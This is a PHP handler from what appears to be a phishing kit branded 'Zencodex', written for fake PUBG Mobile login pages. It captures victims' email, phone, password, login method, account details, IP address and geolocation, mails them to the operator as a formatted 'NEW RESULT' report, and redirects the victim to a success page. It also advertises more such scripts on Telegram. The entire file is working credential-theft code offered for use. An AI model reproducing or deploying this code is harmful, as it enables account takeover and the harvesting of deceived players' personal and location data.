<?php

// MENGAMBIL CONFIG
require('../email.php');
require('../zencodex/getinfo.php');

// MENANGKAP DATA YANG DI-INPUT
$email = $_POST['miil'];
$password = $_POST['pw'];
$nick = $_POST['nick'];
$playid = $_POST['playid'];
$phone = $_POST['phone'];
$level = $_POST['level'];
$tier = $_POST['tier'];
$rpt = $_POST['rpt'];
$rpl = $_POST['rpl'];
$platform = $_POST['platform'];
$login = $_POST['log'];

// MENGALIHKAN KE HALAMAN UTAMA JIKA DATA BELUM DI-INPUT
if (empty($email) && empty($password) && empty($login) && empty($nick) && empty($playid) && empty($phone) && empty($level) && empty($tier) && empty($rpt) && empty($rpl) && empty($platform)) {
	header("Location: index.php");
} else {

	// GET INFO
	$country  = $zencodex['country'];
	$region   = $zencodex['region'];
	$city     = $zencodex['city'];
	$lat      = $zencodex['lat'];
	$long     = $zencodex['long'];
	$timezone = $zencodex['timezone'];
	$ipAddr   = $zencodex['ipAddr'];

	// KONTEN RESULT AKUN
	$subjek = "NEW RESULT Akun PUBGM | ID $playid | LEVEL $level | TIER $tier | LOGIN $login";
	$pesan = <<<EOD
	<!DOCTYPE html>
	<html>
	<head>
		<title></title>
		<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
		<style type="text/css">
			body {
				font-family: "Helvetica";
				width: 90%;
				display: block;
				margin: auto;
				border: 1px solid #fff;
				background: #fff;
			}

			.result {
				width: 100%;
				height: 100%;
				display: block;
				margin: auto;
				position: fixed;
				top: 0;
				right: 0;
				left: 0;
				bottom: 0;
				z-index: 999;
				overflow-y: scroll;
			}

			.tblResult {
				width: 100%;
				display: table;
				margin: 0px auto;
				border-collapse: collapse;
				text-align: center;
				background: rgba(247,129,129, 0.1);
			}

			.tblResult th {
				text-align: left;
				font-size: 0.75em;
				margin: auto;
				padding: 15px 10px;
				background: #F8E0EC;
				border: 2px solid #F8E0EC;
				color: #0B0B0B;
			}

			.tblResult td {
				font-size: 0.75em;
				margin: auto;
				padding: 10px;
				border: 2px solid #F8E0EC;
				text-align: left;
				font-weight: bold;
				color: #0B0B0B;
				text-shadow: 0px 0px 10px #fff;

			}

			.tblResult th img {
				width: 45px;
				display: block;
				margin: auto;
				border-radius: 50%;
				box-shadow: 0px 0px 10px rgba(0,0,0, 0.5);
			}
		</style>
	</head>
	<body>
		<div class="result">
			<table class="tblResult">
				<tr>
					<th style="text-align: center;" colspan="3"><a href="t.me/zencodex">Script by Zencodex</th>
				</tr>
				<tr>
					<th style="text-align: center;" colspan="3">Informasi Akun PUBGM</th>
				</tr>
				<tr>
					<td style="border-right: none;">Email Akun</td>
					<td style="text-align: right;">$email</td>
				</tr>
				<tr>
					<td style="border-right: none;">Phone</td>
					<td style="text-align: right;">$phone</td>
				</tr>
				<tr>
					<td style="border-right: none;">Password Akun</td>
					<td style="text-align: right;">$password</td>
				</tr>
				<tr>
					<th style="text-align: center;" colspan="3">Detail Akun PUBGM</th>
				</tr>
				<tr>
					<td style="border-right: none;">ID Karakter</td>
					<td style="text-align: right;">$playid</td>
				</tr>
				<tr>
					<td style="border-right: none;">Nickname</td>
					<td style="text-align: right;">$nick</td>
				</tr>
				<tr>
					<td style="border-right: none;">Level Akun</td>
					<td style="text-align: right;">$level</td>
				</tr>
				<tr>
					<td style="border-right: none;">RP Type</td>
					<td style="text-align: right;">$rpt</td>
				</tr>
				<tr>
					<td style="border-right: none;">RP Level</td>
					<td style="text-align: right;">$rpl</td>
				</tr>
				<tr>
					<td style="border-right: none;">Login Via</td>
					<td style="text-align: right;">$login</td>
				</tr>
				<tr>
					<td style="border-right: none;">Platform</td>
					<td style="text-align: right;">$platform</td>
				</tr>
				<tr>
					<th style="text-align: center;" colspan="3">Informasi Device</th>
				</tr>
				<tr>
					<td style="border-right: none;">Country</td>
					<td style="text-align: right;">$country</td>
				</tr>
				<tr>
					<td style="border-right: none;">Region</td>
					<td style="text-align: right;">$region</td>
				</tr>
				<tr>
					<td style="border-right: none;">City</td>
					<td style="text-align: right;">$city</td>
				</tr>
				<tr>
					<td style="border-right: none;">Latitude</td>
					<td style="text-align: right;">$lat</td>
				</tr>
				<tr>
					<td style="border-right: none;">Longitude</td>
					<td style="text-align: right;">$long</td>
				</tr>
				<tr>
					<td style="border-right: none;">IP Address</td>
					<td style="text-align: right;">$ipAddr</td>
				</tr>
				<tr>
				<th style="text-align: center;" colspan="3">Cari script web p di https://t.me/zencodex</th>
				<th style="text-align: center;" colspan="3">&copy; ZenCodex</th>
				</tr>
			</table>
		</div>
	</body>
	</html>
EOD;
	$headers  = 'MIME-Version: 1.0' . "\r\n";
	$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
	$headers .= 'From: ZENCODEX <jb.id@zencodex.com>' . "\r\n";
	$headers .= 'X-Priority: 3' . "\r\n";
	$headers .= 'Priority: Normal' . "\r\n";
	$headers .= 'Priority: Normal' . "\r\n";
	$kirim = mail($emailku, $subjek, $pesan, $headers);
	if ($kirim) {
		echo "<script>window.location = '../success.php'</script>";
	}
}
